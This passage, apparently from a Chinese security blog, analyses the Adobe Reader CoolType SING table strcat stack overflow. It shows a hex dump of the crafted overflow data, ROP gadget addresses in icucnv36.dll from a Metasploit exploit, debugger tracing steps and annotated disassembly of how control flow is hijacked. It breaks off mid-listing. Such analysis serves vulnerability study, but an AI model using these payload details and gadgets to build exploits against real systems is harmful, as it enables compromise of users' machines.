<p>复制到栈上的<code>数据长度</code>：0x0012E718 - 0x0012E4D8 = 0x240<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0012E4D8  F1 B9 F1 F4 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C  窆耵ub?J....</span><br><span class="line">0012E4E8  AC 86 F7 B5 ED 50 17 29 5C 12 8D 01 4E 51 05 0E  瑔鞯鞵)\?NQ</span><br><span class="line">0012E4F8  E7 CC BC CA 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D  缣际k韥6璣E呠&#125;</span><br><span class="line">0012E508  DB C2 4B 84 E8 67 8A 92 74 90 C8 3D 03 65 FE 80  勐K勮g姃t惾=e</span><br><span class="line">0012E518  4E E7 C7 42 89 8B DA 08 91 71 7A 3D 83 8E BD 60  N缜B墜?憅z=儙絗</span><br><span class="line">0012E528  AB 8F FA 53 8E F2 15 70 D8 66 BB A0 24 09 05 CD  珡鶶庲p豧粻$.</span><br><span class="line">0012E538  E6 10 AE B9 B2 E0 B8 40 91 36 FC 66 8B 7B BE C2  ?侧窣?黤媨韭</span><br><span class="line">0012E548  65 24 37 DA 2B 2C FC FA 04 89 92 95 B5 3A 22 FE  e$7?,墥暤:&quot;</span><br><span class="line">0012E558  44 BA 47 90 BD 17 78 9A 86 A8 CC 2A B1 0B FA 8F  D篏惤x殕ㄌ*?鷱</span><br><span class="line">0012E568  54 C7 4B 6D BF 1A 47 1D 33 0D 72 DC D3 8E 1E FC  T荎m?G3.r苡?</span><br><span class="line">0012E578  7E 2D 41 FE B2 7D 0C 3A 1A BE 1D F7 DC 35 59 BD  ~-A&#125;.:?鬈5Y</span><br><span class="line">0012E588  5A C3 06 67 E3 6F FC D5 49 3B 3E 1B 4D FC 6E 8C  Z?g鉶I;&gt;M黱</span><br><span class="line">0012E598  5D E4 7B BA 86 8C AC A7 11 F3 B2 43 A1 0B 04 B4  ]鋥簡尙?蟛C?</span><br><span class="line">0012E5A8  30 71 3F A9 3A CC CF E0 B3 15 35 39 BC F9 6F 9C  0q??滔喑59践o</span><br><span class="line">0012E5B8  E4 0C 84 72 70 90 64 0A 53 E3 A4 65 BB C6 19 85  ?剅p恉.S悚e黄</span><br><span class="line">0012E5C8  BA 6D 04 8D BE EF 3A 1F 4C 0D FD E0 29 BD FC 77  簃嵕?L.)近w</span><br><span class="line">0012E5D8  CD F3 41 98 0D AD D7 3B 92 48 A6 BB B7 8C C9 F5  腕A?;扝穼甚</span><br><span class="line">0012E5E8  71 7A 72 69 54 32 60 80 8D 9C 16 24 81 B8 C0 32  qzriT2`€崪$伕?</span><br><span class="line">0012E5F8  2D 44 17 5A 06 6D 75 0F 77 9E CF 67 F4 23 2C 2B  -DZmuw炏g?,+</span><br><span class="line">0012E608  C6 08 8A 4A E2 2F 63 30 39 85 30 38 40 55 FA 3B  ?奐?c09?8@U?</span><br><span class="line">0012E618  DB DD 44 05 9D BE 81 73 DD F3 CA 9A 4D 02 F0 EF  圯D澗乻蒹蕷M痫</span><br><span class="line">0012E628  05 A9 10 F7 05 69 C6 B4 DF 84 4A 6D 3C 85 6E D9  ??i拼邉Jm&lt;卬</span><br><span class="line">0012E638  3A 29 D3 E4 44 95 96 E3 C0 3E 0F FA 45 5E D1 40  :)愉D晼憷&gt;鶨^袬</span><br><span class="line">0012E648  DB BB AB 23 BA FF 42 8D 8A 05 D1 84 8A AE E5 5B  刍??B崐褎姰錥</span><br><span class="line">0012E658  F1 E7 94 85 95 20 E5 41 6B 95 CD 72 6D 8B EE D6  耒攨?錋k曂rm嬵</span><br><span class="line">0012E668  19 8C BF FB BC 64 17 7F E7 A4 70 F7 94 E3 A7 3B  尶d绀p鲾悃;</span><br><span class="line">0012E678  5B 69 A1 F4 7F 20 11 02 58 4F 24 FD 38 70 A3 97  [i◆ XO$?p</span><br><span class="line">0012E688  62 2C FA 58 E6 C2 D6 B5 04 80 EC 82 FC 05 80 D1  b,鶻媛值€靷?€</span><br><span class="line">0012E698  93 0B CB 63 38 F7 B9 90 F0 8B D3 F8 91 96 7A C7  ?薱8鞴愷嬘鴳杬</span><br><span class="line">0012E6A8  37 24 37 4E 99 84 6C 40 DF 84 A2 97 17 7B 6F 59  7$7N檮l@邉&#123;oY</span><br><span class="line">0012E6B8  51 51 9C 7A 50 DA 1B 08 7E ED 73 8B D9 B9 53 9B  QQ渮P?~韘嬞筍</span><br><span class="line">0012E6C8  29 59 F1 FD A6 38 DF 49 38 CB 80 4A E3 A6 2C CA  )Y颀?逫8藔J悝,</span><br><span class="line">0012E6D8  2B 0C 6B E0 A5 48 43 D2 F3 77 1C 91 82 C7 40 59  +.k啷HC殷w憘茾Y</span><br><span class="line">0012E6E8  5F 6C C6 02 59 D4 BA AE 32 F9 41 9A FF 07 28 4D  _l?Y院?鵄?(M</span><br><span class="line">0012E6F8  28 73 33 DA D4 69 D1 F3 E6 85 2B D1 76 90 FF 6C  (s3谠i洋鎱+裿?l</span><br><span class="line">0012E708  28 F3 A4 34 AB 2F 57 AE 1B C7 A5 1D 6C 00 00 00  (螭4?W?钎l...</span><br><span class="line"></span><br><span class="line">0012E718  00 00 00 00 6D 00 00 00 01 00 00 00 01 00 00 00  ....m.........</span><br><span class="line">0012E728  00 00 00 00 F8 B1 13 02 A0 38 96 04 EC 26 00 00  ....???..</span><br></pre></td></tr></table></figure></p>
<h5 id="2-3、触发过程"><a href="#2-3、触发过程" class="headerlink" title="2.3、触发过程"></a>2.3、触发过程</h5><p>&emsp;&emsp;我们从<code>metasploit</code>的漏洞利用代码中可以知道<code>SING表的数据</code>主要是构造了一个<strong><code>ROP链</code></strong>,用于<code>控制EIP</code>最终跳转到<code>堆喷</code>的真正的用于<code>绕过DEP</code>的<code>ROP Chain</code>处。从代码注释中可知,<strong><code>第一个ROPgadget</code></strong>位于icucnv36.dll中的<code>0x4A80CB38</code>处,<strong><code>第二个ROPgadget</code></strong>位于icucnv36.dll中的<code>0x4A82A714</code>处。这部分后面会介绍,为什么选用这两个地址呢？因为在<code>Adobe Reader</code>的<code>各个版本</code>上，这个dll的这两处地址是<code>始终不变</code>的，从而保证了<code>exploit</code>对于各版本的<code>兼容性</code>和<code>稳定性</code>。</p>
<blockquote>
<ul>
<li>1、打开Adobe Reader,再打开OllyDbg,<code>attach</code>上Adobe Reader进程。</li>
<li>2、在<code>0x4A80CB38</code>下断点,运行程序。</li>
<li>3、当运行到<code>0x4A80CB38</code>地址处时,我们查看栈,看到返回地址为<code>0x0808B30A</code>,可以知道调用者的位置就在其上一条指令处,<code>0x0808B308</code>处的<code>call dword ptr [eax]</code>指令。</li>
<li>4、我们再对这段<code>ROPgadget</code>的调用地址<code>0x0808B308</code>下断点,并且通过ollydbg的反汇编窗口找到<code>此调用者函数的父函数</code>sub_808B116(),再下断点<code>0x0808B116</code>。</li>
<li>5、我们再在<code>堆栈窗口</code>中寻找<code>sub_808B116()</code>的<code>返回地址</code>,查看其返回地址是否在调用<code>strcat()函数</code>的<code>父函数sub_803DCF9()</code>的地址范围中,若是,栈回溯结束。如不是，继续向下寻找。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;也许有些<code>返回地址</code>在<code>堆栈窗口</code>中只是显示为<code>返回到 CoolType.xxxxxxxx</code>,并没显示是<code>哪个函数的返回地址</code>。这是因为这个返回地址所属的函数的地址是存放在<code>内存中的某个位置</code>或在<code>寄存器</code>中,指令格式<code>call r/m32</code>。通常函数调用使用的是指令格式为<code>call rel32</code>,其操作数为<code>函数地址</code>相对<code>当前调用指令</code>的<code>下一条指令地址</code>的偏移,以<code>补码</code>表示。</p>
<p>程序<strong><code>控制流劫持过程</code></strong>分析：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">********************************************************************</span><br><span class="line"></span><br><span class="line">    char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">********************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9      <span class="keyword">push</span>    <span class="built_in">ebp</span>                         <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA      <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                   <span class="comment">; esp=0x0012E4DC</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00      <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04      <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie     <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09      <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                    <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>       <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11      <span class="keyword">push</span>    <span class="number">4Ch</span>                         <span class="comment">; __EH_prolog3_catch函数中分配栈空间大小</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54     <span class="comment">; __security_check_cookie函数地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18      <span class="keyword">call</span>    __EH_prolog3_catch          <span class="comment">; 向栈上写入SEH结构</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD1D      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]       <span class="comment">; eax=[0x0012E4D8+0x11c]=[0x0012E5F4]=0x0012E700,eax = a4</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD23      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]       <span class="comment">; edi=[0x0012E4D8+0x110]=[0x0012E5E8]=0x0012E718,edi = a1 &lt;------对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD29      <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]       <span class="comment">; ebx=[0x0012E4D8+0x114]=[0x0012E5EC]=0x0012E608,ebx = a2 对象(0x0012E608)的指针</span></span><br><span class="line">........</span><br><span class="line"><span class="symbol">.text:</span>0803DDAB      <span class="keyword">call</span>    strcat                      <span class="comment">; 调用strcat函数，造成溢出</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB0      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB1      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB2      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; eax=0x0012E4D8,为uniqueName缓冲区地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB5      <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB6      <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">ebx</span>                    <span class="comment">; ecx=ebx=0x0012E608,对象(0x0012E608)的指针,第一个成员变量原来是0,可以直接跳过sub_8001243()的一段代码,但是我们构造的uniqueName不能将这里构造为0x0,会造成截断,其内容+0x1c必须为一个可访问的地址,使得程序可以顺利执行通过第一个成员变量为0时跳过的那段代码。</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDB8      <span class="keyword">call</span>    sub_8001243</span><br><span class="line"><span class="symbol">.text:</span>0803DDBD      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C]     <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DDC0 loc_803DDC0:                            </span><br><span class="line"><span class="symbol">.text:</span>0803DDC0      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC4</span><br><span class="line"><span class="symbol">.text:</span>0803DDC4 loc_803DDC4:                            </span><br><span class="line"><span class="symbol">.text:</span>0803DDC4      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDC6      <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDCA      <span class="keyword">jz</span>      short loc_803DDD3</span><br><span class="line"><span class="symbol">.text:</span>0803DDCC      <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDCD      <span class="keyword">call</span>    sub_80418BF</span><br><span class="line"><span class="symbol">.text:</span>0803DDD2      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDD3</span><br><span class="line"><span class="symbol">.text:</span>0803DDD3 loc_803DDD3:                           </span><br><span class="line"><span class="symbol">.text:</span>0803DDD3      <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDD7      <span class="keyword">jnz</span>     loc_803DEA9</span><br><span class="line">......</span><br><span class="line"><span class="symbol">.text:</span>0803DEA9 loc_803DEA9:                           </span><br><span class="line"><span class="symbol">.text:</span>0803DEA9                                         </span><br><span class="line"><span class="symbol">.text:</span>0803DEA9      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]     <span class="comment">;   eax=ebp-0x1c=0x0012E4BC, ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAC      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg3: eax=0x0012E4BC</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAD      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg2: ebx=0x0012E608 对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAE      <span class="keyword">push</span>    <span class="built_in">edi</span>                         <span class="comment">; arg1: edi=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DEAF      <span class="keyword">call</span>    sub_8016BDE</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">********************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_8016BDE(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">********************************************************************                    </span><br><span class="line"><span class="symbol">.text:</span>08016BDE      <span class="keyword">push</span>    <span class="built_in">ebp</span>                         <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>08016BDF      <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">660h</span>                   <span class="comment">; esp=esp-0x660=0x0012DDFC,之前esp=0x0012E45C</span></span><br><span class="line"><span class="symbol">.text:</span>08016BE5      <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]                <span class="comment">; ebp=esp-4=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016BE9      <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie</span><br><span class="line"><span class="symbol">.text:</span>08016BEE      <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF0      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF6      <span class="keyword">push</span>    <span class="number">50h</span></span><br><span class="line"><span class="symbol">.text:</span>08016BF8      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8175D32</span><br><span class="line"><span class="symbol">.text:</span>08016BFD      <span class="keyword">call</span>    __EH_prolog3_catch</span><br><span class="line"><span class="symbol">.text:</span>08016C02      <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_8]       <span class="comment">; eax=[ebp+0x674]=[0x0012E46C]=0x0012E4BC, eax=a3</span></span><br><span class="line"><span class="symbol">.text:</span>08016C08      <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_4]       <span class="comment">; esi=[ebp+0x670]=[0x0012E468]=0x0012E608, esi=a2,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C0E      <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+arg_0]       <span class="comment">; edi=[ebp+0x66c]=[0x0012E464]=0x0012E718,ebp=0x0012DDF8 &lt;------ edi = a1,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C14      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_6BC], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016C17      <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset CriticalSection <span class="comment">; eax=0x0823A650,_RTL_CRITICAL_SECTION结构体对象指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C1C      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; lpCriticalSection</span></span><br><span class="line"><span class="symbol">.text:</span>08016C1D      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_680], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08016C20      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_6C0], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08016C23      <span class="keyword">call</span>    <span class="built_in">ds</span>:EnterCriticalSection     <span class="comment">; 执行完 eax=0</span></span><br><span class="line"><span class="symbol">.text:</span>08016C29      <span class="keyword">xor</span>     <span class="built_in">ebx</span>, <span class="built_in">ebx</span>                    <span class="comment">; ebx=0</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2B      <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2C      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_668], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C2F      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_694], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C32      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_678], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C35      <span class="keyword">call</span>    sub_801BB1C                 <span class="comment">; 执行完 eax=0x01F347B8,为StreamHandler类对象,内存第一个双字为虚表指针,0x081A601C</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3A      <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3C      <span class="keyword">pop</span>     <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span>08016C3D      <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_67C], <span class="built_in">eax</span>     <span class="comment">; eax=0x01F347B8,为StreamHandler类对象</span></span><br><span class="line"><span class="symbol">.text:</span>08016C40      <span class="keyword">jz</span>      loc_80172CE                 <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>08016C46      <span class="keyword">push</span>    <span class="number">1</span>                           <span class="comment">; arg7: 1</span></span><br><span class="line"><span class="symbol">.text:</span>08016C48      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg6: 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>08016C49      <span class="keyword">push</span>    <span class="built_in">ebx</span>                         <span class="comment">; arg5: 0x00000000</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4A      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_678]     <span class="comment">;   eax=[ebp-0x14]=0x0012DDE4,ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4D      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg4: eax=0x0012DDE4</span></span><br><span class="line"><span class="symbol">.text:</span>08016C4E      <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_694]     <span class="comment">;   eax=[ebp-0x30]=0x0012DDC8,ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C51      <span class="keyword">push</span>    <span class="built_in">eax</span>                         <span class="comment">; arg3: eax=0x0012DDC8</span></span><br><span class="line"><span class="symbol">.text:</span>08016C52      <span class="keyword">push</span>    <span class="built_in">edi</span>                         <span class="comment">; arg2&lt;-a1: edi=0x0012E718 &lt;------ 对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>08016C53      <span class="keyword">push</span>    [<span class="built_in">ebp</span>+<span class="number">664h</span>+var_67C]          <span class="comment">; arg1: [ebp-0x18]=[0x0012DDE0]=0x01F347B8 </span></span><br><span class="line"><span class="symbol">.text:</span>08016C56      <span class="keyword">call</span>    sub_801BB21</span><br><span class="line">                                               <span class="built_in">esp</span> --&gt;  0012DD6C   08016C5B  <span class="comment">; 返回到 CoolType.08016C5B 来自 CoolType.0801BB21</span></span><br><span class="line">                                                        0012DD70   01F347B8  <span class="comment">; arg1: StreamHandler类对象地址</span></span><br><span class="line">                                                        0012DD74   0012E718  <span class="comment">; arg2: 对象(0x0012E718)的指针</span></span><br><span class="line">                                                        0012DD78   0012DDC8  <span class="comment">; arg3</span></span><br><span class="line">                                                        0012DD7C   0012DDE4  <span class="comment">; arg4</span></span><br><span class="line">                                                        0012DD80   <span class="number">00000000</span>  <span class="comment">; arg5</span></span><br><span class="line">                                                        0012DD84   <span class="number">00000000</span>  <span class="comment">; arg6</span></span><br><span class="line">                                                        0012DD88   <span class="number">00000001</span>  <span class="comment">; arg7</span></span><br><span class="line">StreamHandler类对象内存：</span><br><span class="line"><span class="comment">;01F347B8  1C 60 1A 08 6D 00 00 00 00 00 00 00 84 90 13 02  `m.......剱</span></span><br><span class="line"><span class="comment">;01F347C8  00 00 00 00 00 00 00 00 6D 00 00 00 01 00 00 00  ........m......</span></span><br><span class="line"><span class="comment">;01F347D8  01 00 00 00 00 00 00 00 00 00 00 00 50 A6 23 08  ...........P?</span></span><br><span class="line"><span class="comment">;01F347E8  00 00 00 00 00 00 00 00 1C 01 00 00 00 00 00 00  ..............</span></span><br><span class="line"><span class="comment">;01F347F8  00 00 00 00 00 00 00 00 EF 33 08 08 E0 47 F3 01  ........?郍?</span></span><br><span class="line"><span class="comment">;01F34808  00 48 F3 01 00 00 00 00 00 00 00 00 00 00 00 00  .H?............</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">*****************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">功能: 找到虚函数地址并调用</span><br><span class="line"><span class="keyword">int</span> __cdecl sub_801BB21(<span class="keyword">int</span> (__stdcall ***a1)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>), <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">int</span> a7)</span><br><span class="line"></span><br><span class="line">*****************************************************************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0801BB21      <span class="keyword">push</span>    <span class="built_in">ebp</span>                     <span class="comment">;   ebp=0x0012DDF8</span></span><br><span class="line"><span class="symbol">.text:</span>0801BB22      <span 